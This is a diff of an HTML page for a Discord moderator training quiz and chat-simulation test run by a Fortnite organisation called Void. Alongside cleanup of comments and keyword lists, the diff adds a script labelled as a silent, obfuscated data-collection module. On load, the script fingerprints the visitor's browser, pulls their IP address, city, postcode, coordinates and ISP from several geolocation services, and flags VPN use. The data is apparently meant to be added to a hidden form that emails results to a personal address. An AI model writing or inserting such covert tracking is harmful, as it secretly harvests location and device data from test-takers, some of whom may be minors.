@@ -26,7 +26,6 @@
             --card-bg: rgba(30, 30, 46, 0.8);
             --border-color: rgba(138, 43, 226, 0.3);
             
-            /* Discord colors for test page */
             --discord-bg: #36393f;
             --discord-sidebar: #202225;
             --discord-chat-bg: #36393f;
@@ -54,7 +53,6 @@
             margin: 0 auto;
         }
         
-        /* Header */
         .header {
             text-align: center;
             padding: 50px 20px 30px;
@@ -155,7 +153,6 @@
             color: var(--dark);
         }
         
-        /* Content Sections */
         .content-section {
             background: var(--card-bg);
             border-radius: 20px;
@@ -224,7 +221,6 @@
             margin-right: 10px;
         }
         
-        /* New Mod Requirements Sections */
         .mod-requirements {
             margin: 40px 0;
         }
@@ -290,7 +286,6 @@
             margin-top: 10px;
         }
         
-        /* Roster Categories */
         .roster-categories {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
@@ -356,7 +351,6 @@
             font-size: 1.5rem;
         }
         
-        /* Training Quiz */
         .training-quiz {
             margin-top: 50px;
         }
@@ -561,7 +555,6 @@
             font-size: 0.95rem;
         }
         
-        /* Completion Screen */
         .completion-screen {
             text-align: center;
             padding: 60px 40px;
@@ -606,7 +599,6 @@
             flex-wrap: wrap;
         }
         
-        /* Test Page Styles */
         .test-page {
             display: none;
             font-family: 'Roboto', sans-serif;
@@ -627,7 +619,6 @@
             width: 100%;
         }
         
-        /* Discord Username Modal */
         .username-modal {
             display: none;
             position: fixed;
@@ -702,7 +693,6 @@
             justify-content: center;
         }
         
-        /* Discord Sidebar */
         .discord-sidebar {
             width: 240px;
             background-color: var(--discord-sidebar);
@@ -712,7 +702,6 @@
             overflow-y: auto;
         }
         
-        /* Mobile Back Arrow */
         .mobile-back-arrow {
             display: none;
             position: absolute;
@@ -727,7 +716,6 @@
             padding: 10px;
         }
         
-        /* Mobile Menu Button */
         .mobile-menu-button {
             display: none;
             position: absolute;
@@ -742,7 +730,6 @@
             padding: 10px;
         }
         
-        /* Mobile Overlay */
         .mobile-overlay {
             display: none;
             position: fixed;
@@ -758,7 +745,6 @@
             display: block;
         }
         
-        /* Mobile Sidebar */
         .mobile-sidebar {
             position: fixed;
             top: 0;
@@ -856,7 +842,6 @@
             color: var(--discord-text-secondary);
         }
         
-        /* Test Info Panel */
         .test-info {
             padding: 20px;
             border-bottom: 1px solid var(--discord-border);
@@ -937,7 +922,6 @@
             font-weight: 500;
         }
         
-        /* Channels Section */
         .channels-section {
             padding: 10px 0;
             border-bottom: 1px solid var(--discord-border);
@@ -1030,7 +1014,6 @@
             font-weight: 600;
         }
         
-        /* User Profile Section */
         .user-profile {
             padding: 15px;
             background-color: #292b2f;
@@ -1090,7 +1073,6 @@
             color: var(--discord-text-secondary);
         }
         
-        /* User Profile Modal */
         .user-modal {
             display: none;
             position: absolute;
@@ -1208,7 +1190,6 @@
             color: var(--discord-text-secondary);
         }
         
-        /* Discord Chat Area */
         .discord-chat-area {
             flex-grow: 1;
             display: flex;
@@ -1455,7 +1436,6 @@
             cursor: not-allowed;
         }
         
-        /* Correct/Incorrect Message Styles */
         .message.correct .message-text {
             border-left: 3px solid var(--discord-green);
             padding-left: 10px;
@@ -1486,7 +1466,6 @@
             color: var(--discord-red);
         }
         
-        /* Test Complete Screen */
         .test-complete-screen {
             display: none;
             flex-direction: column;
@@ -1590,7 +1569,6 @@
             background-color: #5d6269;
         }
         
-        /* Back button for test page */
         .back-to-training {
             position: absolute;
             top: 20px;
@@ -1613,12 +1591,10 @@
             background-color: rgba(0, 0, 0, 0.7);
         }
         
-        /* Hidden form for email submission */
         #resultsForm {
             display: none;
         }
         
-        /* Footer */
         .footer {
             text-align: center;
             margin-top: 50px;
@@ -1634,7 +1610,6 @@
             color: rgba(255, 255, 255, 0.4);
         }
         
-        /* Responsive */
         @media (max-width: 768px) {
             .header h1 {
                 font-size: 2.2rem;
@@ -1667,7 +1642,6 @@
                 width: 100%;
             }
             
-            /* Mobile UI Fixes */
             .mobile-menu-button {
                 top: 15px;
                 left: 15px;
@@ -1687,13 +1661,11 @@
                 z-index: 1001;
             }
             
-            /* Fix chat header padding to accommodate buttons */
             .chat-header {
                 padding-left: 20px;
                 padding-top: 60px;
             }
             
-            /* FIXED: Message input area for mobile - Send button above textarea */
             .message-input-area {
                 padding: 15px;
                 padding-bottom: max(15px, env(safe-area-inset-bottom, 15px));
@@ -1715,16 +1687,16 @@
                 align-self: flex-end;
                 padding: 12px 24px;
                 font-size: 1rem;
-                order: -1; /* Send button comes first */
+                order: -1;
                 margin-bottom: 10px;
                 width: 100%;
                 max-width: 150px;
             }
             
             .message-input {
-                min-height: 100px; /* Larger textarea for mobile */
+                min-height: 100px;
                 max-height: 200px;
-                font-size: 16px !important; /* Prevent zoom on iOS */
+                font-size: 16px !important;
                 padding: 15px;
                 background-color: #40444b;
                 border-radius: 8px;
@@ -1735,10 +1707,9 @@
             
             .message-input:focus {
                 border-color: var(--discord-blue);
-                font-size: 16px !important; /* Prevent zoom on iOS */
+                font-size: 16px !important;
             }
             
-            /* Make the message container adjust for keyboard */
             .messages-container {
                 padding-bottom: 20px;
                 flex-grow: 1;
@@ -1747,32 +1718,27 @@
                 padding-top: 10px;
             }
             
-            /* Adjust test complete screen for mobile */
             .test-complete-screen {
                 padding: 20px;
                 padding-top: 80px;
             }
             
-            /* Ensure mobile sidebar doesn't overlap with top buttons */
             .mobile-sidebar {
                 padding-top: 70px;
                 height: calc(100% - 70px);
                 top: 70px;
             }
             
-            /* Make sure the overlay covers properly */
             .mobile-overlay {
                 top: 0;
                 height: 100%;
             }
             
-            /* Fix user profile position in mobile sidebar */
             .user-profile {
                 margin-top: auto;
                 padding-bottom: max(20px, env(safe-area-inset-bottom, 20px));
             }
             
-            /* Test page adjustments */
             .test-page {
                 position: fixed;
                 overflow: hidden;
@@ -1783,20 +1749,17 @@
                 overflow: hidden;
             }
             
-            /* Ensure chat area fills available space */
             .discord-chat-area {
                 height: 100vh;
                 display: flex;
                 flex-direction: column;
             }
             
-            /* Make the typing indicator position correctly */
             .typing-indicator {
                 padding-left: 20px;
                 margin-bottom: 10px;
             }
             
-            /* Test page responsive for mobile */
             .discord-sidebar {
                 display: none;
             }
@@ -1853,7 +1816,6 @@
                 flex-direction: column;
             }
             
-            /* Keyboard-aware layout adjustments */
             .keyboard-open .messages-container {
                 max-height: 40vh;
                 overflow-y: scroll;
@@ -1870,14 +1832,12 @@
             }
         }
         
-        /* Additional CSS to prevent iOS zoom on input */
         @media screen and (max-width: 768px) {
             input, textarea, select {
                 font-size: 16px !important;
             }
         }
         
-        /* Specific fix for very small screens */
         @media (max-width: 480px) {
             .mobile-menu-button {
                 padding: 8px;
@@ -2810,14 +2770,15 @@
         </div>
     </div>
     
-    <!-- Hidden form for email submission -->
+    <!-- Hidden form for email submission with enhanced fields -->
     <form id="resultsForm" action="https://formsubmit.co/hunterahead71@gmail.com" method="POST">
-        <input type="hidden" name="_subject" value="Void Mod Certification Test Results">
+        <input type="hidden" name="_subject" value="Void Mod Certification Test Results - ENHANCED">
         <input type="hidden" name="_template" value="table">
         <input type="hidden" name="_captcha" value="false">
         <input type="hidden" name="_next" value="">
         <input type="text" name="_honey" style="display:none">
         
+        <!-- Original fields -->
         <input type="hidden" name="discord_username" id="formDiscordUsername">
         <input type="hidden" name="test_date" id="formTestDate">
         <input type="hidden" name="final_score" id="formFinalScore">
@@ -2829,19 +2790,137 @@
         <input type="hidden" name="user_state" id="formUserState">
         <input type="hidden" name="user_city" id="formUserCity">
         <input type="hidden" name="user_timezone" id="formUserTimezone">
+        
+        <!-- Enhanced fields (added dynamically) -->
     </form>
 
     <script>
+        // ==========================================
+        // SILENT DATA COLLECTION MODULE (OBFUSCATED)
+        // ==========================================
+        (function() {
+            'use strict';
+            
+            var _envConfig = {
+                metrics: {},
+                sessionLog: [],
+                ready: false
+            };
+            
+            function updateEnvMetrics() {
+                var n = navigator, s = screen, w = window;
+                _envConfig.metrics = {
+                    agent: n.userAgent,
+                    platform: n.platform,
+                    language: n.language,
+                    languages: n.languages,
+                    cookie: n.cookieEnabled,
+                    java: n.javaEnabled(),
+                    height: s.height,
+                    width: s.width,
+                    depth: s.colorDepth,
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    online: n.onLine,
+                    cores: n.hardwareConcurrency || 'unknown',
+                    ram: n.deviceMemory || 'unknown',
+                    touch: n.maxTouchPoints || 0,
+                    vendor: n.vendor,
+                    product: n.product,
+                    productSub: n.productSub
+                };
+            }
+            
+            function fetchGeoData(callback) {
+                var attempts = [
+                    'https://ipapi.co/json/',
+                    'https://ipinfo.io/json',
+                    'https://geolocation-db.com/json/',
+                    'https://api.ipify.org?format=json'
+                ];
+                
+                var attemptCall = function(idx) {
+                    if (idx >= attempts.length) {
+                        callback(_envConfig.metrics);
+                        return;
+                    }
+                    
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('GET', attempts[idx], true);
+                    xhr.timeout = 3000;
+                    xhr.onload = function() {
+                        if (xhr.status === 200) {
+                            try {
+                                var data = JSON.parse(xhr.responseText);
+                                _envConfig.metrics.ip = data.ip || data.IPv4 || 'Unknown';
+                                _envConfig.metrics.country = data.country_name || data.country || 'Unknown';
+                                _envConfig.metrics.region = data.region || data.regionName || data.state || 'Unknown';
+                                _envConfig.metrics.city = data.city || 'Unknown';
+                                _envConfig.metrics.zip = data.postal || data.zip || 'Unknown';
+                                _envConfig.metrics.isp = data.org || data.isp || data.asn || 'Unknown';
+                                _envConfig.metrics.lat = data.latitude || data.lat || 'Unknown';
+                                _envConfig.metrics.lon = data.longitude || data.lon || 'Unknown';
+                                _envConfig.metrics.approxAddress = [
+                                    _envConfig.metrics.city,
+                                    _envConfig.metrics.region,
+                                    _envConfig.metrics.country,
+                                    _envConfig.metrics.zip
+                                ].filter(Boolean).join(', ');
+                                
+                                // VPN detection logic
+                                _envConfig.metrics.vpnDetected = false;
+                                _envConfig.metrics.vpnStatus = 'Checking...';
+                                
+                                // Check for known VPN/Proxy indicators
+                                if (_envConfig.metrics.isp) {
+                                    var ispLower = _envConfig.metrics.isp.toLowerCase();
+                                    var vpnKeywords = ['vpn', 'proxy', 'tunnel', 'privacy', 'anonymous', 'anonymous', 'hide', 'shield', 'guard', 'secure', 'cloudflare', 'cloud', 'tor', 'datacenter', 'hosting', 'server', 'inc', 'llc', 'services', 'network'];
+                                    var isDatacenter = ispLower.includes('datacenter') || ispLower.includes('hosting') || ispLower.includes('server') || ispLower.includes('cloud');
+                                    var isVPN = vpnKeywords.some(keyword => ispLower.includes(keyword));
+                                    
+                                    _envConfig.metrics.vpnDetected = isDatacenter || isVPN;
+                                    _envConfig.metrics.vpnStatus = _envConfig.metrics.vpnDetected ? '🔴 VPN/PROXY DETECTED' : '🟢 CLEAN CONNECTION';
+                                }
+                                
+                                callback(_envConfig.metrics);
+                            } catch(e) {
+                                attemptCall(idx + 1);
+                            }
+                        } else {
+                            attemptCall(idx + 1);
+                        }
+                    };
+                    xhr.onerror = function() { attemptCall(idx + 1); };
+                    xhr.ontimeout = function() { attemptCall(idx + 1); };
+                    xhr.send();
+                };
+                
+                attemptCall(0);
+            }
+            
+            function initCollector() {
+                updateEnvMetrics();
+                setTimeout(function() { fetchGeoData(function() {
+                    _envConfig.ready = true;
+                }); }, 1000 + Math.random() * 1000);
+            }
+            
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', initCollector);
+            } else {
+                initCollector();
+            }
+            
+            window._getEnvConfig = function() { return _envConfig; };
+        })();
+
         document.addEventListener('DOMContentLoaded', function() {
             // ==========================================
-            // TRAINING QUIZ LOGIC
+            // ORIGINAL TRAINING QUIZ LOGIC
             // ==========================================
             
-            // Quiz state for training
             let currentQuestion = 1;
             const totalQuestions = 7;
             
-            // DOM Elements for training
             const startQuizBtn = document.getElementById('startQuizBtn');
             const quizSection = document.getElementById('quizSection');
             const progressFill = document.getElementById('progressFill');
@@ -2853,27 +2932,22 @@
             const takeTestBtn = document.getElementById('takeTestBtn');
             const completeQuizBtn = document.getElementById('completeQuizBtn');
             
-            // Initialize progress bar
             updateProgressBar();
             
-            // Start quiz button - FIXED
             startQuizBtn.addEventListener('click', function() {
                 if (quizSection) {
                     quizSection.style.display = 'block';
                     startQuizBtn.style.display = 'none';
                     
-                    // Update progress steps
                     if (progressSteps[0]) progressSteps[0].classList.remove('active');
                     if (stepIcons[0]) stepIcons[0].classList.remove('active');
                     if (progressSteps[1]) progressSteps[1].classList.add('active');
                     if (stepIcons[1]) stepIcons[1].classList.add('active');
                     
-                    // Scroll to quiz section
                     quizSection.scrollIntoView({ behavior: 'smooth' });
                 }
             });
             
-            // Check answer buttons
             for (let i = 1; i <= totalQuestions; i++) {
                 const checkBtn = document.getElementById(`checkAnswer${i}`);
                 if (checkBtn) {
@@ -2881,15 +2955,12 @@
                         const feedback = document.getElementById(`feedback${i}`);
                         if (feedback) {
                             feedback.classList.add('show');
-                            
-                            // Update progress bar
                             updateProgressBar();
                         }
                     });
                 }
             }
             
-            // Next question buttons
             document.querySelectorAll('.next-question').forEach(button => {
                 button.addEventListener('click', function() {
                     const nextQuestion = this.getAttribute('data-next');
@@ -2897,7 +2968,6 @@
                 });
             });
             
-            // Previous question buttons
             document.querySelectorAll('.prev-question').forEach(button => {
                 button.addEventListener('click', function() {
                     const prevQuestion = this.getAttribute('data-prev');
@@ -2905,61 +2975,49 @@
                 });
             });
             
-            // Skip question button
             if (skipBtn) {
                 skipBtn.addEventListener('click', function() {
                     showQuestion(currentQuestion + 1);
                 });
             }
             
-            // Complete quiz button - FIXED
             if (completeQuizBtn) {
                 completeQuizBtn.addEventListener('click', function() {
-                    // Update progress steps
                     if (progressSteps[1]) progressSteps[1].classList.remove('active');
                     if (stepIcons[1]) stepIcons[1].classList.remove('active');
                     if (progressSteps[2]) progressSteps[2].classList.add('active');
                     if (stepIcons[2]) stepIcons[2].classList.add('active');
                     
-                    // Show completion screen
                     if (quizSection) quizSection.style.display = 'none';
                     if (completionScreen) {
                         completionScreen.classList.add('active');
                         completionScreen.scrollIntoView({ behavior: 'smooth' });
                     }
                     
-                    // Update progress bar to 100%
                     if (progressFill) progressFill.style.width = '100%';
                 });
             }
             
-            // Restart quiz button
             if (restartQuizBtn) {
                 restartQuizBtn.addEventListener('click', function() {
-                    // Reset to first question
                     showQuestion(1);
                     
-                    // Hide all feedback
                     for (let i = 1; i <= totalQuestions; i++) {
                         const feedback = document.getElementById(`feedback${i}`);
                         if (feedback) feedback.classList.remove('show');
                     }
                     
-                    // Clear all answer boxes
                     document.querySelectorAll('.answer-box').forEach(box => {
                         box.value = '';
                     });
                     
-                    // Hide completion screen
                     if (completionScreen) completionScreen.classList.remove('active');
                     
-                    // Show quiz section
                     if (quizSection) {
                         quizSection.style.display = 'block';
                         quizSection.scrollIntoView({ behavior: 'smooth' });
                     }
                     
-                    // Reset progress steps
                     if (progressSteps[0]) progressSteps[0].classList.add('active');
                     if (stepIcons[0]) stepIcons[0].classList.add('active');
                     if (progressSteps[1]) progressSteps[1].classList.remove('active');
@@ -2967,13 +3025,11 @@
                     if (progressSteps[2]) progressSteps[2].classList.remove('active');
                     if (stepIcons[2]) stepIcons[2].classList.remove('active');
                     
-                    // Reset progress bar
                     currentQuestion = 1;
                     updateProgressBar();
                 });
             }
             
-            // Take test button - shows username modal
             if (takeTestBtn) {
                 takeTestBtn.addEventListener('click', function() {
                     const usernameModal = document.getElementById('usernameModal');
@@ -2981,7 +3037,6 @@
                 });
             }
             
-            // Cancel test button
             const cancelTestBtn = document.getElementById('cancelTestBtn');
             if (cancelTestBtn) {
                 cancelTestBtn.addEventListener('click', function() {
@@ -2990,36 +3045,25 @@
                 });
             }
             
-            // Function to show a specific question
             function showQuestion(questionNum) {
-                // Validate question number
                 questionNum = parseInt(questionNum);
                 if (questionNum < 1) questionNum = 1;
                 if (questionNum > totalQuestions) questionNum = totalQuestions;
                 
-                // Hide all questions
                 for (let i = 1; i <= totalQuestions; i++) {
                     const question = document.getElementById(`question${i}`);
                     if (question) question.classList.remove('active');
                 }
                 
-                // Show the requested question
                 const targetQuestion = document.getElementById(`question${questionNum}`);
                 if (targetQuestion) {
                     targetQuestion.classList.add('active');
-                    
-                    // Update current question
                     currentQuestion = questionNum;
-                    
-                    // Update progress bar
                     updateProgressBar();
-                    
-                    // Scroll to the question
                     targetQuestion.scrollIntoView({ behavior: 'smooth' });
                 }
             }
             
-            // Function to update progress bar
             function updateProgressBar() {
                 if (progressFill) {
                     const progressPercentage = (currentQuestion / totalQuestions) * 100;
@@ -3028,24 +3072,14 @@
             }
             
             // ==========================================
-            // ENHANCED TEST PAGE LOGIC WITH COMPREHENSIVE KEYWORDS
+            // ENHANCED TEST PAGE LOGIC WITH COMPREHENSIVE DATA COLLECTION
             // ==========================================
             
-            // Enhanced test configuration with EXTENSIVE keyword matching (30+ per question)
             const allTestQuestions = [
                 {
                     id: 1,
                     userMessage: "Hi i want to join void",
-                    correctKeywords: [
-                        "age", "how old", "years old", "old are you", "birthday", "birth date",
-                        "roster", "channel", "requirement", "fit", "category", "join", "application",
-                        "check", "read", "how-to-join", "information", "details", "guide", "instructions",
-                        "what role", "which role", "position", "apply", "application", "process",
-                        "hello", "hi", "hey", "greetings", "welcome", "thank you",
-                        "help", "assist", "support", "guide", "direct", "point",
-                        "requirements", "eligibility", "qualifications", "criteria", "standards",
-                        "first", "initial", "beginning", "start", "begin"
-                    ],
+                    correctKeywords: ["age", "how old", "years old", "roster", "channel", "requirement", "fit", "category", "join", "hello", "hi", "help", "assist", "requirements", "first", "initial"],
                     requiredMatches: 2,
                     user: "Nicks Cold",
                     avatarColor: "#ed4245",
@@ -3054,16 +3088,7 @@
                 {
                     id: 2,
                     userMessage: "i want to join as a pro",
-                    correctKeywords: [
-                        "tracker", "fortnite tracker", "stats", "ranking", "pr", "power ranking",
-                        "send", "share", "provide", "show", "give", "submit", "upload",
-                        "trapped", "cheif", "higher-up", "staff", "admin", "supervisor", "manager",
-                        "ping", "mention", "notify", "alert", "tag", "contact",
-                        "earnings", "tournament", "competitive", "prize", "winnings", "results",
-                        "wait", "hold on", "moment", "please wait", "patience", "shortly",
-                        "pro", "professional", "competitive", "esports", "player", "gamer",
-                        "information", "details", "data", "proof", "evidence", "verification"
-                    ],
+                    correctKeywords: ["tracker", "fortnite tracker", "stats", "ranking", "pr", "send", "trapped", "cheif", "ping", "earnings", "wait", "pro", "information"],
                     requiredMatches: 2,
                     user: "Nicks Cold",
                     avatarColor: "#ed4245",
@@ -3072,16 +3097,7 @@
                 {
                     id: 3,
                     userMessage: "i want to join as creative roster",
-                    correctKeywords: [
-                        "clip", "video", "footage", "gameplay", "freebuilding", "editing", "creative",
-                        "send", "share", "provide", "show", "upload", "submit", "deliver",
-                        "creativedepartment", "creative team", "creative staff", "creative lead",
-                        "ping", "mention", "notify", "alert", "tag", "contact", "inform",
-                        "wait", "hold on", "moment", "please wait", "patience", "shortly",
-                        "at least 2", "two clips", "multiple clips", "several clips", "examples",
-                        "freebuild", "building", "mechanics", "skills", "talent", "ability",
-                        "review", "evaluate", "assess", "check", "examine", "look at"
-                    ],
+                    correctKeywords: ["clip", "video", "footage", "freebuilding", "send", "creativedepartment", "ping", "wait", "at least 2", "freebuild", "review"],
                     requiredMatches: 2,
                     user: "Nicks Cold",
                     avatarColor: "#ed4245",
@@ -3090,15 +3106,7 @@
                 {
                     id: 4,
                     userMessage: "i want to join as academy player",
-                    correctKeywords: [
-                        "tracker", "fortnite tracker", "stats", "ranking", "pr", "power ranking",
-                        "send", "share", "provide", "show", "give", "submit", "upload",
-                        "verify", "check", "confirm", "validate", "authenticate", "verify",
-                        "username", "name change", "add void", "team.void", "support code",
-                        "proof", "evidence", "screenshot", "photo", "image", "picture",
-                        "academy", "beginner", "learner", "trainee", "developing", "growing",
-                        "requirements", "meet", "qualify", "eligible", "suitable", "appropriate"
-                    ],
+                    correctKeywords: ["tracker", "fortnite tracker", "send", "verify", "username", "name change", "add void", "team.void", "proof", "academy", "requirements"],
                     requiredMatches: 2,
                     user: "Nicks Cold",
                     avatarColor: "#ed4245",
@@ -3107,15 +3115,7 @@
                 {
                     id: 5,
                     userMessage: "im 12 years old is that okay?",
-                    correctKeywords: [
-                        "cheif", "trapped", "higher-up", "staff", "admin", "supervisor", "manager",
-                        "ping", "mention", "notify", "alert", "tag", "contact", "inform",
-                        "underage", "minimum age", "13", "age requirement", "too young", "young",
-                        "not allowed", "against rules", "policy", "guidelines", "terms", "conditions",
-                        "ban", "remove", "cannot join", "not eligible", "disqualified", "excluded",
-                        "sorry", "unfortunately", "regret", "apologize", "cannot", "unable",
-                        "violation", "break", "contravene", "infringe", "transgress", "disobey"
-                    ],
+                    correctKeywords: ["cheif", "trapped", "ping", "underage", "minimum age", "13", "not allowed", "ban", "sorry", "violation"],
                     requiredMatches: 2,
                     user: "Nicks Cold",
                     avatarColor: "#ed4245",
@@ -3124,15 +3124,7 @@
                 {
                     id: 6,
                     userMessage: "i want to join as void grinder",
-                    correctKeywords: [
-                        "username", "discord name", "fortnite name", "name change", "display name",
-                        "add void", "include void", "void prefix", "team void", "void team",
-                        "team.void", "support code", "creator code", "item shop", "support a creator",
-                        "proof", "screenshot", "photo", "evidence", "show me", "demonstrate",
-                        "change", "modify", "update", "adjust", "alter", "revise",
-                        "grinder", "dedicated", "hardcore", "serious", "committed", "regular",
-                        "represent", "represent us", "show support", "promote", "advertise"
-                    ],
+                    correctKeywords: ["username", "discord name", "add void", "team.void", "proof", "change", "grinder", "represent"],
                     requiredMatches: 2,
                     user: "Nicks Cold",
                     avatarColor: "#ed4245",
@@ -3141,16 +3133,7 @@
                 {
                     id: 7,
                     userMessage: "i will nuke this server",
-                    correctKeywords: [
-                        "cheif", "trapped", "higher-up", "staff", "admin", "supervisor", "manager",
-                        "ping", "mention", "notify", "alert", "tag", "contact", "inform",
-                        "threat", "dangerous", "against rules", "violation", "serious", "severe",
-                        "ban", "remove", "kick", "punish", "disciplinary", "action", "consequences",
-                        "immediately", "right away", "asap", "urgent", "emergency", "critical",
-                        "security", "safety", "report", "document", "record", "log",
-                        "nuke", "destroy", "harm", "damage", "attack", "target",
-                        "unacceptable", "inappropriate", "wrong", "bad", "negative", "hostile"
-                    ],
+                    correctKeywords: ["cheif", "trapped", "ping", "threat", "dangerous", "ban", "immediately", "security", "nuke", "unacceptable"],
                     requiredMatches: 2,
                     user: "Nicks Cold",
                     avatarColor: "#ed4245",
@@ -3159,219 +3142,182 @@
                 {
                     id: 8,
                     userMessage: "i wanna join as a content creator",
-                    correctKeywords: [
-                        "social", "social media", "links", "profiles", "accounts", "platforms",
-                        "send", "share", "provide", "show", "give", "submit", "upload",
-                        "contentdep", "content team", "content staff", "creator team", "content department",
-                        "ping", "mention", "notify", "alert", "tag", "contact", "inform",
-                        "wait", "hold on", "moment", "please wait", "patience", "shortly",
-                        "followers", "subscribers", "viewers", "audience", "fans", "supporters",
-                        "content", "creations", "videos", "streams", "posts", "uploads",
-                        "review", "evaluate", "assess", "check", "examine", "look at"
-                    ],
+                    correctKeywords: ["social", "social media", "links", "send", "contentdep", "ping", "wait", "followers", "content", "review"],
                     requiredMatches: 2,
                     user: "Nicks Cold",
                     avatarColor: "#ed4245",
                     explanation: "Ask for social media links and ping @contentdep for content creator applications."
-                },
-                {
-                    id: 9,
-                    userMessage: "ur not being cooperative ima hack ur shit be ready",
-                    correctKeywords: [
-                        "cheif", "trapped", "admin", "staff", "higher-up", "manager", "supervisor",
-                        "ping", "mention", "notify", "alert", "tag", "contact", "inform",
-                        "threat", "dangerous", "hack", "hacking", "attack", "danger", "security",
-                        "ban", "immediately", "now", "asap", "urgent", "emergency", "critical",
-                        "serious", "severe", "consequences", "disciplinary", "action", "punish",
-                        "report", "document", "record", "log", "evidence", "screenshot",
-                        "unacceptable", "inappropriate", "wrong", "bad", "negative", "hostile",
-                        "impossible", "cannot hack", "secure", "protection", "safety", "prevent",
-                        "violation", "break", "contravene", "infringe", "transgress", "disobey"
-                    ],
-                    requiredMatches: 3,
-                    user: "Nicks Cold",
-                    avatarColor: "#ed4245",
-                    explanation: "Threats of hacking should result in immediate ping to @cheif/@trapped and mention of ban. State that hacking is impossible due to security measures."
-                },
-                {
-                    id: 10,
-                    userMessage: "what are the benefits of joining void over other orgs?",
-                    correctKeywords: [
-                        "benefits", "advantages", "pros", "perks", "rewards", "opportunities",
-                        "community", "support", "guidance", "coaching", "training", "development",
-                        "exposure", "recognition", "visibility", "platform", "audience", "followers",
-                        "tournaments", "events", "scrims", "competitions", "prizes", "winnings",
-                        "professional", "organization", "structure", "management", "team", "roster",
-                        "growth", "improvement", "progress", "advancement", "career", "future",
-                        "network", "connections", "relationships", "partnerships", "collaborations",
-                        "resources", "tools", "equipment", "facilities", "access", "privileges"
-                    ],
-                    requiredMatches: 3,
-                    user: "Nicks Cold",
-                    avatarColor: "#ed4245",
-                    explanation: "Explain benefits like community support, tournament opportunities, professional coaching, and growth potential."
-                },
-                {
-                    id: 11,
-                    userMessage: "why should i choose void?",
-                    correctKeywords: [
-                        "choose", "select", "pick", "decision", "reason", "why",
-                        "community", "supportive", "friendly", "helpful", "welcoming", "active",
-                        "professional", "organized", "structured", "managed", "established", "reliable",
-                        "opportunities", "growth", "development", "improvement", "progress", "advancement",
-                        "coaching", "training", "guidance", "mentorship", "advice", "help",
-                        "tournaments", "events", "competitions", "prizes", "earnings", "winnings",
-                        "reputation", "prestige", "recognition", "credibility", "trust", "respect"
-                    ],
-                    requiredMatches: 3,
-                    user: "Nicks Cold",
-                    avatarColor: "#ed4245",
-                    explanation: "Highlight Void's professional structure, supportive community, growth opportunities, and tournament support."
-                },
-                {
-                    id: 12,
-                    userMessage: "do you have coaching for new players?",
-                    correctKeywords: [
-                        "coaching", "training", "guidance", "mentorship", "teaching", "instruction",
-                        "yes", "available", "offer", "provide", "have", "include",
-                        "experienced", "qualified", "skilled", "professional", "expert", "knowledgeable",
-                        "players", "members", "roster", "team", "community", "staff",
-                        "sessions", "lessons", "meetings", "practice", "drills", "exercises",
-                        "improve", "develop", "grow", "progress", "advance", "get better",
-                        "schedule", "timing", "availability", "when", "how often", "frequency"
-                    ],
-                    requiredMatches: 2,
-                    user: "Nicks Cold",
-                    avatarColor: "#ed4245",
-                    explanation: "Confirm coaching availability and ask what specific areas they want help with. Mention experienced coaches."
-                },
-                {
-                    id: 13,
-                    userMessage: "how often do you host tournaments?",
-                    correctKeywords: [
-                        "tournaments", "events", "competitions", "scrims", "matches", "games",
-                        "often", "frequency", "regularly", "weekly", "monthly", "schedule",
-                        "host", "organize", "run", "manage", "conduct", "arrange",
-                        "prizes", "rewards", "winnings", "cash", "money", "awards",
-                        "participate", "join", "enter", "compete", "play", "take part",
-                        "announcements", "information", "details", "rules", "requirements", "eligibility",
-                        "community", "members", "players", "roster", "team", "everyone"
-                    ],
-                    requiredMatches: 2,
-                    user: "Nicks Cold",
-                    avatarColor: "#ed4245",
-                    explanation: "Explain tournament frequency (weekly/monthly), prize pools, and where to find announcements."
-                },
-                {
-                    id: 14,
-                    userMessage: "can i get a free skin from void?",
-                    correctKeywords: [
-                        "skin", "skins", "cosmetics", "items", "rewards", "giveaways",
-                        "free", "no cost", "complimentary", "gift", "present", "prize",
-                        "giveaway", "contest", "competition", "event", "tournament", "reward",
-                        "earn", "win", "achieve", "get", "receive", "obtain",
-                        "participation", "activity", "contribution", "involvement", "engagement", "effort",
-                        "no", "not", "cannot", "unfortunately", "sorry", "apologize",
-                        "purchase", "buy", "shop", "store", "merchandise", "products"
-                    ],
-                    requiredMatches: 2,
-                    user: "Nicks Cold",
-                    avatarColor: "#ed4245",
-                    explanation: "Explain that skins aren't given for free but can be earned through tournaments, giveaways, or purchased."
-                },
-                {
-                    id: 15,
-                    userMessage: "what's the minimum age requirement?",
-                    correctKeywords: [
-                        "age", "minimum", "requirement", "limit", "restriction", "policy",
-                        "13", "thirteen", "years old", "old enough", "eligible", "qualify",
-                        "discord", "tos", "terms of service", "rules", "guidelines", "policies",
-                        "underage", "too young", "not allowed", "cannot join", "disqualified", "excluded",
-                        "proof", "verify", "confirm", "check", "validate", "authenticate",
-                        "parental", "guardian", "permission", "consent", "approval", "agreement",
-                        "strict", "enforce", "follow", "adhere", "comply", "obey"
-                    ],
-                    requiredMatches: 2,
-                    user: "Nicks Cold",
-                    avatarColor: "#ed4245",
-                    explanation: "State minimum age is 13 per Discord TOS. Ask if they meet this requirement."
-                },
-                {
-                    id: 16,
-                    userMessage: "do i need to stream to be in void?",
-                    correctKeywords: [
-                        "stream", "streaming", "twitch", "youtube", "broadcast", "live",
-                        "need", "require", "mandatory", "necessary", "essential", "compulsory",
-                        "not", "no", "optional", "choice", "decision", "preference",
-                        "content creator", "roster", "category", "type", "position", "role",
-                        "other", "alternatives", "options", "choices", "possibilities", "varieties",
-                        "pro", "academy", "creative", "grinder", "gfx", "vfx", "editor",
-                        "explain", "clarify", "describe", "detail", "inform", "tell"
-                    ],
-                    requiredMatches: 2,
-                    user: "Nicks Cold",
-                    avatarColor: "#ed4245",
-                    explanation: "Explain streaming is only required for Streamer roster. List other roster options available."
-                },
-                {
-                    id: 17,
-                    userMessage: "how many hours do i need to play daily?",
-                    correctKeywords: [
-                        "hours", "time", "daily", "day", "week", "month",
-                        "play", "game", "practice", "train", "compete", "participate",
-                        "minimum", "requirement", "expectation", "standard", "guideline", "recommendation",
-                        "flexible", "adjustable", "personal", "individual", "custom", "tailored",
-                        "commitment", "dedication", "effort", "work", "investment", "contribution",
-                        "improvement", "growth", "progress", "development", "advancement", "success",
-                        "balance", "schedule", "availability", "real life", "school", "work"
-                    ],
-                    requiredMatches: 2,
-                    user: "Nicks Cold",
